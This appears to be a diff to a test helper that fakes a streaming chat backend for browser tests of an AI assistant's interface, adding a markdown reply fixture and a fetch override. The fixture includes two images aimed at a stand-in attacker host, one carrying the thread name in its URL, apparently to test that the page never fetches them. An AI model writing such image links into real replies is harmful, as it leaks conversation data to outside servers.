@@ -174,54 +174,122 @@ export interface Request {
   readonly params: Record<string, unknown>;
 }
 
-/** What a turn streams: the person's message, the reply growing, then the reply itself. */
-function turn(message: { id: number; params: Record<string, unknown> }): string {
-  const target = String(message.params['thread']);
+/** A JSON-RPC message the fake sends. */
+type Note = Readonly<Record<string, unknown>>;
+
+/**
+ * What a turn streams: the person's message, the reply growing piece by piece, then the reply
+ * itself and the turn's result (answering call `id`).
+ */
+function turnNotes(
+  target: string,
+  prompt: string,
+  pieces: readonly string[],
+  id: number,
+): readonly Note[] {
   const after = target === THREAD ? HISTORY.length : 0;
-  const notes = [
-    {
-      jsonrpc: '2.0',
-      method: 'thread/event',
-      params: {
-        thread: target,
-        event: event(
-          after + 1,
-          'message.added',
-          { role: 'user', parts: [{ type: 'text', text: String(message.params['prompt']) }] },
-          target,
-        ),
-      },
+  const added = (seq: number, role: string, text: string): Note => ({
+    jsonrpc: '2.0',
+    method: 'thread/event',
+    params: {
+      thread: target,
+      event: event(seq, 'message.added', { role, parts: [{ type: 'text', text }] }, target),
     },
-    {
+  });
+  return [
+    added(after + 1, 'user', prompt),
+    ...pieces.map((text) => ({
       jsonrpc: '2.0',
       method: 'turn/live',
-      params: { thread: target, update: { kind: 'text', text: 'Glad to ' } },
-    },
+      params: { thread: target, update: { kind: 'text', text } },
+    })),
+    added(after + 2, 'assistant', pieces.join('')),
     {
       jsonrpc: '2.0',
-      method: 'turn/live',
-      params: { thread: target, update: { kind: 'text', text: 'help.' } },
-    },
-    {
-      jsonrpc: '2.0',
-      method: 'thread/event',
-      params: {
-        thread: target,
-        event: event(
-          after + 2,
-          'message.added',
-          { role: 'assistant', parts: [{ type: 'text', text: 'Glad to help.' }] },
-          target,
-        ),
-      },
-    },
-    {
-      jsonrpc: '2.0',
-      id: message.id,
+      id,
       result: { turn: { outcome: 'completed', model_calls: 1, tool_calls: 0, tokens: TOKENS } },
     },
   ];
+}
+
+function turn(message: { id: number; params: Record<string, unknown> }): string {
+  const notes = turnNotes(
+    String(message.params['thread']),
+    String(message.params['prompt']),
+    ['Glad to ', 'help.'],
+    message.id,
+  );
   return notes.map((note) => `data: ${JSON.stringify(note)}\n\n`).join('');
+}
+
+/** What the person asks for a reply in markdown (`streamReply`). */
+export const MARKDOWN_PROMPT = 'What changed?';
+
+/**
+ * A reply in markdown as a model writes it: a heading, a table, a task list, code, a link, and
+ * two images that must never be fetched, one written in markdown and one in raw HTML.
+ */
+export const MARKDOWN_REPLY = [
+  '## The parser is fixed',
+  '',
+  '`parse()` returned a value for **empty input** and unwrapped a failed parse; it now returns ' +
+    '`None` for both. See [the issue](https://github.com/glave-ai/glave/issues/226).',
+  '',
+  '| Input | Before | After |',
+  '| :---- | :----: | ----: |',
+  '| `""` | panic | `None` |',
+  '| `"12"` | `12` | `Some(12)` |',
+  '',
+  '- [x] Return `None` for empty input',
+  '- [ ] Document the change',
+  '',
+  '```rust',
+  'fn parse(input: &str) -> Option<Value> {',
+  '    if input.is_empty() {',
+  '        return None;',
+  '    }',
+  '    input.parse().ok()',
+  '}',
+  '```',
+  '',
+  '![Coverage by file](https://evil.example/chart.png?thread=make-the-tests-pass)',
+  '',
+  '<img src="https://evil.example/pixel.png">',
+].join('\n');
+
+/**
+ * Makes the page's next turn stream `reply` to `THREAD` a few characters at a time, as a model
+ * would: the page's own `fetch` answers `turn/start` with a stream that sends each piece on its
+ * own, `delay` milliseconds apart, so the page renders the reply as it grows.
+ */
+export async function streamReply(page: Page, reply = MARKDOWN_REPLY, delay = 15): Promise<void> {
+  const pieces = reply.match(/[\s\S]{1,6}/gu) ?? [];
+  const notes = turnNotes(THREAD, MARKDOWN_PROMPT, pieces, 0);
+  await page.addInitScript(
+    ({ notes, delay }) => {
+      const real = window.fetch.bind(window);
+      window.fetch = async (input, init) => {
+        const body = typeof init?.body === 'string' ? init.body : '';
+        if (!body.includes('"turn/start"')) {
+          return real(input, init);
+        }
+        const { id } = JSON.parse(body) as { id: number };
+        const encoder = new TextEncoder();
+        const stream = new ReadableStream<Uint8Array>({
+          async start(controller) {
+            for (const note of notes) {
+              const message = 'result' in note ? { ...note, id } : note;
+              controller.enqueue(encoder.encode(`data: ${JSON.stringify(message)}\n\n`));
+              await new Promise((resolve) => setTimeout(resolve, delay));
+            }
+            controller.close();
+          },
+        });
+        return new Response(stream, { headers: { 'Content-Type': 'text/event-stream' } });
+      };
+    },
+    { notes, delay },
+  );
 }
 
 /** The answer to a call that is not a turn; `started` holds the threads started so far. */
